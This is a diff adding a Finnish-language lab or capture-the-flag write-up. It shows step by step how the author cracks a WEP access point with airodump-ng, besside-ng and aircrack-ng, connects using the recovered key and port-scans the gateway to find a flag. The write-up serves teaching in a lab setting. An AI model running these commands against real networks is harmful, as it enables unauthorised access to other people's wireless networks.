@@ -334,6 +334,110 @@ Yritin alkuun muutamaa ilmiselvää käyttäjänimi + salasana -yhdistelmää, k
 </p>
 
 
+### Legacy
+
+#### 07. What is the flag on the wifi-old AP website?
+
+Aloitetaan tehtävä taas käyttämällä airodumpia wlan70-rajapinnassa:
+
+```bash
+sudo airodump-ng wlan70
+```
+
+<p align="center">
+<img width="877" height="488" alt="image" src="https://github.com/user-attachments/assets/b604998d-ea32-4a44-97d7-f39eb738feca" />
+  <br>
+  <em>WEP, heh.</em>
+</p>
+
+Tehdään tässä samalla tavalla kuin Larin luentomateriaalissa eli generoidaan **besside-ng**-työkalulla alkuun liikennettä ja annetaan tämän pyöriä hetken aikaa:
+
+```bash
+sudo besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan70 -v
+```
+**-c 3**, koska wifi-old käyttää 3-kanavaa, kuten airodumpin tulosteessa näkyi.
+
+Käynnistetään tämän jälkeen **aircrack-ng**-työkalu, joka analysoi kaapatut WEP-paketit ja niissä esiintyvät IV-arvot (Initialization Vectors).
+
+```bash
+sudo aircrack-ng wep.cap
+```
+
+<p align="center">
+<img width="724" height="327" alt="image" src="https://github.com/user-attachments/assets/91a2d6de-6718-4fc8-ad6d-15a9f24fc648" />
+  <br>
+  <em>Avain - löydetty'd</em>
+</p>
+
+Tämä ei kuitenkaan ole vielä lippu, koska tehtävänantona löytää se tukiaseman sivuilta.
+
+Koska wlan0 on edelleen edellisen tehtävän jäljiltä yhteydessä wifi-free -verkkoon, katkaistaan yhteys ja tarkistetaan yhteys:
+
+```bash
+sudo iw dev wlan0 disconnect
+```
+
+```bash
+iw dev wlan0 link
+```
+
+**Not connected**. Vapautetaan vielä vanha DHCP lease:
+
+```bash
+sudo dhclient -r wlan0
+```
+
+**Killed old client process**. Kokeillaan tämän jälkeen WEP-verkkoa ja tarkistetaan, että yhdistäminen on onnistunut:
+
+```bash
+sudo iw dev wlan0 connect wifi-old key d:0:11BB33CD55
+```
+
+```bash
+iw dev wlan0 link
+```
+
+<p align="center">
+<img width="403" height="252" alt="image" src="https://github.com/user-attachments/assets/49cd406f-9dfd-4dc3-b24d-dbdc6726f2ab" />
+  <br>
+  <em>I'm in!</em>
+</p>
+
+Haetaan IP-osoite DHCP:llä ja tarkistetaan, että osoite on saatu:
+
+```bash
+sudo dhclient wlan0
+```
+
+```bash
+ip addr show wlan0
+```
+
+<p align="center">
+<img width="728" height="123" alt="image" src="https://github.com/user-attachments/assets/ba4aa472-127e-44fd-be5f-4811d26b9dee" />
+  <br>
+  <em>Yhteys muodostettu!</em>
+</p>
+
+DHCP-palvelin oli myöntänyt osoitteen ja verkkoyhteys oli muodostunut onnistuneesti. Tarkistetaan vielä reititystiedot komennolla ```ip route``` ja tulosteesta näkyi, että WLAN-rajapinta on nyt liitetty verkkoon (**192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.61**) eli myös tukiasema on samassa aliverkossa. Tuntuu, että olisin tehnyt tämän joskus aiemminkin. Pingattu jälleen oletettuun default gatewayhyn (192.168.1.1) ja se vastasi. Tehdään vielä samaan syssyyn porttiskannaus:
+
+```bash
+nmap -sV 192.168.1.1
+```
+
+<p align="center">
+<img width="708" height="211" alt="image" src="https://github.com/user-attachments/assets/a3bebce2-de60-497e-afe6-5c6e98764164" />
+  <br>
+  <em>Hyvältä näyttää.</em>
+</p>
+
+Eli HTTP- ja HTTPS -palvelut ovat tässäkin olemassa. Mennään siis selaimella default gateway -osoitteeseen, ja lippu löytyikin jo ennen autentikointia.
+
+<p align="center">
+<img width="670" height="824" alt="image" src="https://github.com/user-attachments/assets/c3656953-cc59-4cdd-9df6-bc8837901b2f" />
+  <br>
+  <em>Lippu - löydetty'd</em>
+</p>
 
 
 
